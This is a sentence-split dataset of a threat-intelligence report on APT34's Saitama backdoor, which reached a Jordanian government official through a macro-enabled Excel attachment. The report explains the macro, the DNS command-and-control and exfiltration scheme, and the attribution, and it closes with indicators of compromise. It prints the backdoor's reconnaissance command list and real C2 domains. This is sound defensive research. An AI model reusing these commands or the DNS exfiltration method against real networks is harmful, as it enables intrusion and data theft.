{"id": "sentence_0xf0fb2106", "report_id": "report_0x6854fe7f", "report_date": "2022-05-10T00:00:00Z", "report_title": "APT34 targets Jordan Government using new Saitama backdoor", "report_url": "https://blog.malwarebytes.com/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor", "chapter_id": "chapter_0x1d4c950d", "chapter_title": "APT34 targets Jordan Government using new Saitama backdoor", "text": "Posted: May 10, 2022 by Threat Intelligence Team"}
{"id": "sentence_0xf7d62ac6", "report_id": "report_0x6854fe7f", "report_date": "2022-05-10T00:00:00Z", "report_title": "APT34 targets Jordan Government using new Saitama backdoor", "report_url": "https://blog.malwarebytes.com/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor", "chapter_id": "chapter_0x1d4c950d", "chapter_title": "APT34 targets Jordan Government using new Saitama backdoor", "text": "On April 26th, we identified a suspicious email that targeted a government official from Jordans foreign ministry. The email contained a malicious Excel document that drops a new backdoor named Saitama. Following our investigation, we were able to attribute this attack to the known Iranian Actor APT34. Also known as OilRig/COBALT GYPSY/IRN2/HELIX KITTEN, APT34 is..."}
{"id": "sentence_0x3c21c719", "report_id": "report_0x6854fe7f", "report_date": "2022-05-10T00:00:00Z", "report_title": "APT34 targets Jordan Government using new Saitama backdoor", "report_url": "https://blog.malwarebytes.com/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor", "chapter_id": "chapter_0x1d4c950d", "chapter_title": "APT34 targets Jordan Government using new Saitama backdoor", "text": "On April 26th, we identified a suspicious email that targeted a government official from Jordans foreign ministry. The email contained a malicious Excel document that drops a new backdoor named Saitama. Following our investigation, we were able to attribute this attack to the known Iranian Actor APT34."}
{"id": "sentence_0xe6b92895", "report_id": "report_0x6854fe7f", "report_date": "2022-05-10T00:00:00Z", "report_title": "APT34 targets Jordan Government using new Saitama backdoor", "report_url": "https://blog.malwarebytes.com/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor", "chapter_id": "chapter_0x1d4c950d", "chapter_title": "APT34 targets Jordan Government using new Saitama backdoor", "text": "Also known as OilRig/COBALT GYPSY/IRN2/HELIX KITTEN, APT34 is an Iranian threat group that has targeted Middle Eastern countries and victims worldwide since at least 2014. The group is known to focus on the financial, governmental, energy, chemical, and telecommunication sectors."}
{"id": "sentence_0x3dbe02d4", "report_id": "report_0x6854fe7f", "report_date": "2022-05-10T00:00:00Z", "report_title": "APT34 targets Jordan Government using new Saitama backdoor", "report_url": "https://blog.malwarebytes.com/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor", "chapter_id": "chapter_0x1d4c950d", "chapter_title": "APT34 targets Jordan Government using new Saitama backdoor", "text": "In this blog post, we describe the attack flow and share details about the Saitama backdoor."}
{"id": "sentence_0x1cf43877", "report_id": "report_0x6854fe7f", "report_date": "2022-05-10T00:00:00Z", "report_title": "APT34 targets Jordan Government using new Saitama backdoor", "report_url": "https://blog.malwarebytes.com/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor", "chapter_id": "chapter_0x16e440c0", "chapter_title": "APT34 targets Jordan Government using new Saitama backdoor", "text": "Threat Intelligence"}
{"id": "sentence_0xaeb949bb", "report_id": "report_0x6854fe7f", "report_date": "2022-05-10T00:00:00Z", "report_title": "APT34 targets Jordan Government using new Saitama backdoor", "report_url": "https://blog.malwarebytes.com/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor", "chapter_id": "chapter_0x18cbb5cc", "chapter_title": "Malicious email file", "text": "The malicious email was sent to the victim via a Microsoft Outlook account with the subject Confirmation Receive Document with an Excel file called Confirmation Receive Document.xls. The sender pretends to be a person from the Government of Jordan by using its coat of arms as a signature."}
{"id": "sentence_0x35e91a35", "report_id": "report_0x6854fe7f", "report_date": "2022-05-10T00:00:00Z", "report_title": "APT34 targets Jordan Government using new Saitama backdoor", "report_url": "https://blog.malwarebytes.com/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor", "chapter_id": "chapter_0x18cbb5cc", "chapter_title": "Malicious email file", "text": "Figure 1: Malicious email"}
{"id": "sentence_0xaec273f7", "report_id": "report_0x6854fe7f", "report_date": "2022-05-10T00:00:00Z", "report_title": "APT34 targets Jordan Government using new Saitama backdoor", "report_url": "https://blog.malwarebytes.com/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor", "chapter_id": "chapter_0xc7352122", "chapter_title": "Excel document", "text": "The Excel attachment contains a macro that performs malicious activities. The document has an image that tries to convince the victim to enable a macro."}
{"id": "sentence_0x281f7dea", "report_id": "report_0x6854fe7f", "report_date": "2022-05-10T00:00:00Z", "report_title": "APT34 targets Jordan Government using new Saitama backdoor", "report_url": "https://blog.malwarebytes.com/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor", "chapter_id": "chapter_0xc7352122", "chapter_title": "Excel document", "text": "Figure 2: Excel doc"}
{"id": "sentence_0x889b4053", "report_id": "report_0x6854fe7f", "report_date": "2022-05-10T00:00:00Z", "report_title": "APT34 targets Jordan Government using new Saitama backdoor", "report_url": "https://blog.malwarebytes.com/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor", "chapter_id": "chapter_0xc7352122", "chapter_title": "Excel document", "text": "After enabling the macro, the image is replaced with the Jordan governments the coat of the arms:"}
{"id": "sentence_0xd58a5826", "report_id": "report_0x6854fe7f", "report_date": "2022-05-10T00:00:00Z", "report_title": "APT34 targets Jordan Government using new Saitama backdoor", "report_url": "https://blog.malwarebytes.com/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor", "chapter_id": "chapter_0xc7352122", "chapter_title": "Excel document", "text": "Figure 3: Excel doc after enabling the macro"}
{"id": "sentence_0xdf74cb78", "report_id": "report_0x6854fe7f", "report_date": "2022-05-10T00:00:00Z", "report_title": "APT34 targets Jordan Government using new Saitama backdoor", "report_url": "https://blog.malwarebytes.com/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor", "chapter_id": "chapter_0xc7352122", "chapter_title": "Excel document", "text": "The macro has been executed on WorkBook_Open(). Here are the main functionalities of this macro:"}
{"id": "sentence_0x9878217b", "report_id": "report_0x6854fe7f", "report_date": "2022-05-10T00:00:00Z", "report_title": "APT34 targets Jordan Government using new Saitama backdoor", "report_url": "https://blog.malwarebytes.com/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor", "chapter_id": "chapter_0xc7352122", "chapter_title": "Excel document", "text": "Figure 4: Macro"}
{"id": "sentence_0x5376f176", "report_id": "report_0x6854fe7f", "report_date": "2022-05-10T00:00:00Z", "report_title": "APT34 targets Jordan Government using new Saitama backdoor", "report_url": "https://blog.malwarebytes.com/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor", "chapter_id": "chapter_0xc7352122", "chapter_title": "Excel document", "text": "Hides the current sheet and shows the new sheet that contains the coat of arms image.Calls the eNotif function which is used to send a notification of each steps of macro execution to its server using the DNS protocol. To send a notification it builds the server domain for that step that contains the following parts: qw + identification of the step (in this step zbabz) + random number + domain name (joexpediagroup.com) = qwzbabz7055.joexpediagroup.com. Then it uses the following WMI query to get the IP address of the request: Select * From Win32_PingStatus Where Address = & p_sHostName & which performs the DNS communication the the created subdomain. Creates a TaskService object and Gets the task folder that contains the list of the current tasksCalls ENotif function Checks if there is a mouse connected to PC and if that is the case performs the following stepsChecks the existence of the Update.exe file and if for some reason it has not been written to disk, it writes it using a technique that loads a DotNet assembly directly using mscorlib and Assembly.Load by manually accessing the VTable of the IUnknown. This technique was taken from Github (link). Even though, this technique was not used in this macro since the file was already written, the function name (Test) suggests that the threat actor is trying to implement this technique in future attacks. Finally, it calls the ENotif function. Creates %APPDATA%/MicrosoftUpdate directory Creates Update.exe, Update.exe.config and Microsoft.Exchange.WenServices.dll Reads the content of the UserForm1.label1, UserForm2.label1 and UserForm3.label1 that are in base64 format, decodes them and finally writes them into the created files in the previous step Calls a ENotif function for each writes function"}
{"id": "sentence_0x37748483", "report_id": "report_0x6854fe7f", "report_date": "2022-05-10T00:00:00Z", "report_title": "APT34 targets Jordan Government using new Saitama backdoor", "report_url": "https://blog.malwarebytes.com/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor", "chapter_id": "chapter_0xc7352122", "chapter_title": "Excel document", "text": "Figure 5: Load .Net assembly"}
{"id": "sentence_0x68ebc257", "report_id": "report_0x6854fe7f", "report_date": "2022-05-10T00:00:00Z", "report_title": "APT34 targets Jordan Government using new Saitama backdoor", "report_url": "https://blog.malwarebytes.com/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor", "chapter_id": "chapter_0xc7352122", "chapter_title": "Excel document", "text": "Defines a xml schema for a scheduled task and registers it using the RegisterTask function. The name of the scheduled task is MicrosoftUpdate and is used to make update.exe persistent."}
{"id": "sentence_0xe01c1846", "report_id": "report_0x6854fe7f", "report_date": "2022-05-10T00:00:00Z", "report_title": "APT34 targets Jordan Government using new Saitama backdoor", "report_url": "https://blog.malwarebytes.com/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor", "chapter_id": "chapter_0xc7352122", "chapter_title": "Excel document", "text": "Figure 6: Task Schema"}
{"id": "sentence_0x3a03f56b", "report_id": "report_0x6854fe7f", "report_date": "2022-05-10T00:00:00Z", "report_title": "APT34 targets Jordan Government using new Saitama backdoor", "report_url": "https://blog.malwarebytes.com/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor", "chapter_id": "chapter_0x2235d838", "chapter_title": "Saitama Backdoor A finite state machine", "text": "The dropped payload is a small backdoor that is written in .Net. It has the following interesting pdb path: E:\\Saitama\\Saitama.Agent\\obj\\Release\\Saitama.Agent.pdb."}
{"id": "sentence_0x263965b9", "report_id": "report_0x6854fe7f", "report_date": "2022-05-10T00:00:00Z", "report_title": "APT34 targets Jordan Government using new Saitama backdoor", "report_url": "https://blog.malwarebytes.com/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor", "chapter_id": "chapter_0x2235d838", "chapter_title": "Saitama Backdoor A finite state machine", "text": "Saitama backdoor abuses the DNS protocol for its command and control communications. This is stealthier than other communication methods, such as HTTP. Also, the actor cleverly uses techniques such as compression and long random sleep times. They employed these tricks to disguise malicious traffic in between legitimate traffic."}
{"id": "sentence_0xeeab7866", "report_id": "report_0x6854fe7f", "report_date": "2022-05-10T00:00:00Z", "report_title": "APT34 targets Jordan Government using new Saitama backdoor", "report_url": "https://blog.malwarebytes.com/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor", "chapter_id": "chapter_0x2235d838", "chapter_title": "Saitama Backdoor A finite state machine", "text": "Another element that we found interesting about this backdoor is the way that it is implemented. The whole flow of the program is defined explicitly as a finite-state machine, as shown in the Figure 7. In short, the machine will change its state depending on the command sent to every state. Graphically, the program flow can be seen as this:"}
{"id": "sentence_0xd9450407", "report_id": "report_0x6854fe7f", "report_date": "2022-05-10T00:00:00Z", "report_title": "APT34 targets Jordan Government using new Saitama backdoor", "report_url": "https://blog.malwarebytes.com/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor", "chapter_id": "chapter_0x2235d838", "chapter_title": "Saitama Backdoor A finite state machine", "text": "Figure 7: Graphical view of the state machine"}
{"id": "sentence_0xbb64280b", "report_id": "report_0x6854fe7f", "report_date": "2022-05-10T00:00:00Z", "report_title": "APT34 targets Jordan Government using new Saitama backdoor", "report_url": "https://blog.malwarebytes.com/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor", "chapter_id": "chapter_0x2235d838", "chapter_title": "Saitama Backdoor A finite state machine", "text": "The finite-machine state can be:"}
{"id": "sentence_0xee4f848", "report_id": "report_0x6854fe7f", "report_date": "2022-05-10T00:00:00Z", "report_title": "APT34 targets Jordan Government using new Saitama backdoor", "report_url": "https://blog.malwarebytes.com/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor", "chapter_id": "chapter_0x16489375", "chapter_title": "BEGIN", "text": "It is the initial state of the machine. It just accepts the start command that puts the machine into the ALIVE state."}
{"id": "sentence_0xd486ed3a", "report_id": "report_0x6854fe7f", "report_date": "2022-05-10T00:00:00Z", "report_title": "APT34 targets Jordan Government using new Saitama backdoor", "report_url": "https://blog.malwarebytes.com/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor", "chapter_id": "chapter_0xf8bd9c", "chapter_title": "ALIVE", "text": "This state fetches the C&C server, expecting to receive a command from the attackers. These servers are generated by using the PRNG algorithm that involves transformations like the Mersenne Twister. These transformations will generate subdomains of the hard coded domains in the Config class (Figure 8)."}
{"id": "sentence_0x6a673177", "report_id": "report_0x6854fe7f", "report_date": "2022-05-10T00:00:00Z", "report_title": "APT34 targets Jordan Government using new Saitama backdoor", "report_url": "https://blog.malwarebytes.com/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor", "chapter_id": "chapter_0xf8bd9c", "chapter_title": "ALIVE", "text": "Figure 8: Main domains are hardcoded"}
{"id": "sentence_0xf1e81384", "report_id": "report_0x6854fe7f", "report_date": "2022-05-10T00:00:00Z", "report_title": "APT34 targets Jordan Government using new Saitama backdoor", "report_url": "https://blog.malwarebytes.com/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor", "chapter_id": "chapter_0xf8bd9c", "chapter_title": "ALIVE", "text": "Figure 9 shows an example of the generated subdomain:"}
{"id": "sentence_0x2f6f9e23", "report_id": "report_0x6854fe7f", "report_date": "2022-05-10T00:00:00Z", "report_title": "APT34 targets Jordan Government using new Saitama backdoor", "report_url": "https://blog.malwarebytes.com/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor", "chapter_id": "chapter_0xf8bd9c", "chapter_title": "ALIVE", "text": "Figure 9: Connection attempt to a C&C server"}
{"id": "sentence_0xe2e72a7", "report_id": "report_0x6854fe7f", "report_date": "2022-05-10T00:00:00Z", "report_title": "APT34 targets Jordan Government using new Saitama backdoor", "report_url": "https://blog.malwarebytes.com/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor", "chapter_id": "chapter_0xf8bd9c", "chapter_title": "ALIVE", "text": "This state has two possible next stages. If the performed DNS request fails, the next stage is SLEEP. Otherwise, the next stage is RECEIVE."}
{"id": "sentence_0x86424cd8", "report_id": "report_0x6854fe7f", "report_date": "2022-05-10T00:00:00Z", "report_title": "APT34 targets Jordan Government using new Saitama backdoor", "report_url": "https://blog.malwarebytes.com/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor", "chapter_id": "chapter_0x14718f6", "chapter_title": "SLEEP and SECOND SLEEP", "text": "These states put the backdoor in sleep mode. The amount of time that the program will sleep is determined by the previous stage. It is clear that one of the main motivations of the actor is to be as stealthy as possible. For example, unsuccessful DNS requests puts the backdoor in sleep mode for a time between 6 and 8 hours! There are different sleep times depending on the situations (values are expressed in milliseconds):"}
{"id": "sentence_0xff2a668", "report_id": "report_0x6854fe7f", "report_date": "2022-05-10T00:00:00Z", "report_title": "APT34 targets Jordan Government using new Saitama backdoor", "report_url": "https://blog.malwarebytes.com/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor", "chapter_id": "chapter_0x14718f6", "chapter_title": "SLEEP and SECOND SLEEP", "text": "Figure 10: A different sleep time for every situation"}
{"id": "sentence_0x4e26eb25", "report_id": "report_0x6854fe7f", "report_date": "2022-05-10T00:00:00Z", "report_title": "APT34 targets Jordan Government using new Saitama backdoor", "report_url": "https://blog.malwarebytes.com/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor", "chapter_id": "chapter_0x14718f6", "chapter_title": "SLEEP and SECOND SLEEP", "text": "There is also a Second Sleep state that puts the program on sleep mode a different amount of time."}
{"id": "sentence_0xa9c3b737", "report_id": "report_0x6854fe7f", "report_date": "2022-05-10T00:00:00Z", "report_title": "APT34 targets Jordan Government using new Saitama backdoor", "report_url": "https://blog.malwarebytes.com/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor", "chapter_id": "chapter_0x3ede5b59", "chapter_title": "RECEIVE", "text": "This state is used to receiving commands from the C&C servers. Commands are sent using the IP address field that is returned by the DNS requests. Further details about the communication protocol are provided later in this report. In a nutshell, every DNS request is capable of receiving 4 bytes. The backdoor will concatenate responses, building buffers in that way. These buffers will contain the commands that the backdoor will execute."}
{"id": "sentence_0x13b12911", "report_id": "report_0x6854fe7f", "report_date": "2022-05-10T00:00:00Z", "report_title": "APT34 targets Jordan Government using new Saitama backdoor", "report_url": "https://blog.malwarebytes.com/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor", "chapter_id": "chapter_0x3f448779", "chapter_title": "DO (DoTask)", "text": "That state will execute commands received from the server. The backdoor has capabilities like executing remote pre-established commands, custom commands or dropping files. The communication supports compression, also. The following figure shows the list of possible commands that can be executed by the backdoor."}
{"id": "sentence_0x7b58d740", "report_id": "report_0x6854fe7f", "report_date": "2022-05-10T00:00:00Z", "report_title": "APT34 targets Jordan Government using new Saitama backdoor", "report_url": "https://blog.malwarebytes.com/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor", "chapter_id": "chapter_0x3f448779", "chapter_title": "DO (DoTask)", "text": "ID Type Command1PSGet-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress2PSGet-NetNeighbor -AddressFamily IPv4 | Select-Object IPADDress3CMD whoami4PS[System.Environment]::OSVersion.VersionString5CMDnet user6[NOT USED]7PSGet-ChildItem -Path C:\\Program Files | Select-Object Name8PSGet-ChildItem -Path C:\\Program Files (x86) | Select-Object Name9PSGet-ChildItem -Path C: | Select-Object Name10CMDhostname11PSGet-NetTCPConnection | Where-Object {$_.State -eq Established} | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort12PS$(ping -n 1 10.65.4.50 | findstr /i ttl) -eq $null;$(ping -n 1 10.65.4.51 | findstr /i ttl) -eq $null;$(ping -n 1 10.65.65.65 | findstr /i ttl) -eq $null;$(ping -n 1 10.65.53.53 | findstr /i ttl) -eq $null;$(ping -n 1 10.65.21.200 | findstr /i ttl) -eq $null13PSnslookup ise-posture.mofagov.gover.local | findstr /i Address;nslookup webmail.gov.jo | findstr /i Address14PS$(ping -n 1 10.10.21.201 | findstr /i ttl) -eq $null;$(ping -n 1 10.10.19.201 | findstr /i ttl) -eq $null;$(ping -n 1 10.10.19.202 | findstr /i ttl) -eq $null;$(ping -n 1 10.10.24.200 | findstr /i ttl) -eq $null15PS$(ping -n 1 10.10.10.4 | findstr /i ttl) -eq $null;$(ping -n 1 10.10.50.10 | findstr /i ttl) -eq $null;$(ping -n 1 10.10.22.50 | findstr /i ttl) -eq $null;$(ping -n 1 10.10.45.19 | findstr /i ttl) -eq $null16PS$(ping -n 1 10.65.51.11 | findstr /i ttl) -eq $null;$(ping -n 1 10.65.6.1 | findstr /i ttl) -eq $null;$(ping -n 1 10.65.52.200 | findstr /i ttl) -eq $null;$(ping -n 1 10.65.6.3 | findstr /i ttl) -eq $null17PS$(ping -n 1 10.65.45.18 | findstr /i ttl) -eq $null;$(ping -n 1 10.65.28.41 | findstr /i ttl) -eq $null;$(ping -n 1 10.65.36.13 | findstr /i ttl) -eq $null;$(ping -n 1 10.65.51.10 | findstr /i ttl) -eq $null18PS$(ping -n 1 10.10.22.42 | findstr /i ttl) -eq $null;$(ping -n 1 10.10.23.200 | findstr /i ttl) -eq $null;$(ping -n 1 10.10.45.19 | findstr /i ttl) -eq $null;$(ping -n 1 10.10.19.50 | findstr /i ttl) -eq $null19PS$(ping -n 1 10.65.45.3 | findstr /i ttl) -eq $null;$(ping -n 1 10.65.4.52 | findstr /i ttl) -eq $null;$(ping -n 1 10.65.31.155 | findstr /i ttl) -eq $null;$(ping -n 1 ise-posture.mofagov.gover.local | findstr /i ttl) -eq $null20PSGet-NetIPConfiguration | Foreach IPv4DefaultGateway | Select-Object NextHop21PSGet-DnsClientServerAddress -AddressFamily IPv4 | Select-Object SERVERAddresses22CMDsysteminfo | findstr /i \\Domain\\Figure 11: List of predefined commands"}
{"id": "sentence_0x185a7744", "report_id": "report_0x6854fe7f", "report_date": "2022-05-10T00:00:00Z", "report_title": "APT34 targets Jordan Government using new Saitama backdoor", "report_url": "https://blog.malwarebytes.com/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor", "chapter_id": "chapter_0x3f448779", "chapter_title": "DO (DoTask)", "text": "It is pretty shocking to see that even when attackers have the possibility of sending any command, they choose to add that predefined list in the backdoor in Base64 format. As we can see, some of them are common reconnaissance snippets, but some of them are not that common. In fact, some of the commands contain internal IPs and also internal domain names (like ise-posture.mofagov.gover.local). That shows that this malware was clearly targeted and also indicates that the actor has some previous knowledge about the internal infrastructure of the victim."}
{"id": "sentence_0x255f8ec1", "report_id": "report_0x6854fe7f", "report_date": "2022-05-10T00:00:00Z", "report_title": "APT34 targets Jordan Government using new Saitama backdoor", "report_url": "https://blog.malwarebytes.com/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor", "chapter_id": "chapter_0x9c6fa9ca", "chapter_title": "SEND SEND AND RECEIVE", "text": "The Send state is used to send the results generated by commands to the actors server. In this case, the name of the subdomain will contain the data. As domain names are used to exfiltrate unknown amounts of data, attackers had to split this data in different buffers. Every buffer is then sent through a different DNS request. As it can be seen in the Figure 12, all the required information in order to reconstruct original data is sent to the attackers. The size of the buffer is only sent in the first packet."}
{"id": "sentence_0xf17552f7", "report_id": "report_0x6854fe7f", "report_date": "2022-05-10T00:00:00Z", "report_title": "APT34 targets Jordan Government using new Saitama backdoor", "report_url": "https://blog.malwarebytes.com/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor", "chapter_id": "chapter_0x9c6fa9ca", "chapter_title": "SEND SEND AND RECEIVE", "text": "Figure 12: Send data to server"}
{"id": "sentence_0x8dea21bd", "report_id": "report_0x6854fe7f", "report_date": "2022-05-10T00:00:00Z", "report_title": "APT34 targets Jordan Government using new Saitama backdoor", "report_url": "https://blog.malwarebytes.com/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor", "chapter_id": "chapter_0x33b20efb", "chapter_title": "Attribution", "text": "There are several indicators that suggest that this campaign has been operated by APT34."}
{"id": "sentence_0x66eaf3aa", "report_id": "report_0x6854fe7f", "report_date": "2022-05-10T00:00:00Z", "report_title": "APT34 targets Jordan Government using new Saitama backdoor", "report_url": "https://blog.malwarebytes.com/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor", "chapter_id": "chapter_0x33b20efb", "chapter_title": "Attribution", "text": "Maldoc similarity: The madoc used in this campaign shared some similarities with maldocs used in previous campaigns of this actor. More specifically similar to what was mentioned in CheckPoints report this maldoc registers a scheduled task that would launch the executable every X minutes, also it uses the same anti sandboxing technique (checking if there is a mouse connected to the PC or not). Finally, we see a similar pattern to beacon back to the attacker server and inform the attacker about the current stage of execution. Victims similarity: The group is known to target the government of Jordan and this is the case in this campaign. Payload similarity: DNS is the most common method used by APT34 for its C&C communications. The group is also known to use uncommon encodings such as Base32 and Base36 in its previous campaigns. The Saitama backdoor uses a similar Base32 encoding for sending data to the servers that is used by DNSpionage. Also, to build subdomains it uses Base32 encoding that is similar to what was reported by Mandiant."}
{"id": "sentence_0xc8416e24", "report_id": "report_0x6854fe7f", "report_date": "2022-05-10T00:00:00Z", "report_title": "APT34 targets Jordan Government using new Saitama backdoor", "report_url": "https://blog.malwarebytes.com/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor", "chapter_id": "chapter_0x33b20efb", "chapter_title": "Attribution", "text": "Malwarebytes customers are protected from this attack via our Anti-Exploit layer."}
{"id": "sentence_0x3380e917", "report_id": "report_0x6854fe7f", "report_date": "2022-05-10T00:00:00Z", "report_title": "APT34 targets Jordan Government using new Saitama backdoor", "report_url": "https://blog.malwarebytes.com/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor", "chapter_id": "chapter_0xcc98c330", "chapter_title": "IOCs", "text": "Maldoc: Confirmation Receive Document.xls 26884f872f4fae13da21fa2a24c24e963ee1eb66da47e270246d6d9dc7204c2b Saitama backdoor: update.exe e0872958b8d3824089e5e1cfab03d9d98d22b9bcb294463818d721380075a52d C2s: uber-asia.com asiaworldremit.com joexpediagroup.com"}
{"id": "sentence_0xaf6e214d", "report_id": "report_0x6854fe7f", "report_date": "2022-05-10T00:00:00Z", "report_title": "APT34 targets Jordan Government using new Saitama backdoor", "report_url": "https://blog.malwarebytes.com/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor", "chapter_id": "chapter_0xcc98c330", "chapter_title": "IOCs", "text": "SHARE THIS ARTICLE"}
{"id": "sentence_0x5de0bf31", "report_id": "report_0x6854fe7f", "report_date": "2022-05-10T00:00:00Z", "report_title": "APT34 targets Jordan Government using new Saitama backdoor", "report_url": "https://blog.malwarebytes.com/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor", "chapter_id": "chapter_0xcc98c330", "chapter_title": "IOCs", "text": "ABOUT THE AUTHOR"}
{"id": "sentence_0x2eece41a", "report_id": "report_0x6854fe7f", "report_date": "2022-05-10T00:00:00Z", "report_title": "APT34 targets Jordan Government using new Saitama backdoor", "report_url": "https://blog.malwarebytes.com/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor", "chapter_id": "chapter_0xcc98c330", "chapter_title": "IOCs", "text": "Threat Intelligence Team"}
